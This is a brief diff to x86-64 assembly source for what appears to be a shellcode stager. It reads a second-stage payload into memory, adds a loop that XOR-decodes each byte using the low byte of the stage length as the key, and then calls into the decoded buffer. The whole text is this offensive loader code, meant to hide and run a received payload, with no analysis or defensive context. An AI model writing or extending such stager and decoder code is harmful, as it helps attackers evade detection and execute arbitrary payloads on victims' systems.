@@ -72,6 +72,7 @@ syscall
 
 ;Length of stage
 pop rdx
+push rdx
 
 
 mov rsi, r10
@@ -79,6 +80,19 @@ mov rdi,r8
 xor rax,rax
 syscall
 
+pop r11
+;Decrypt routine
+mov rdi, r10
+mov rsi, r11
+mov rax, r11
+
+DECRYPT:
+
+xor BYTE [rdi], SIL
+inc rdi
+dec rax
+test rax,rax
+jnz DECRYPT
 call r10
 
 MAGIC:
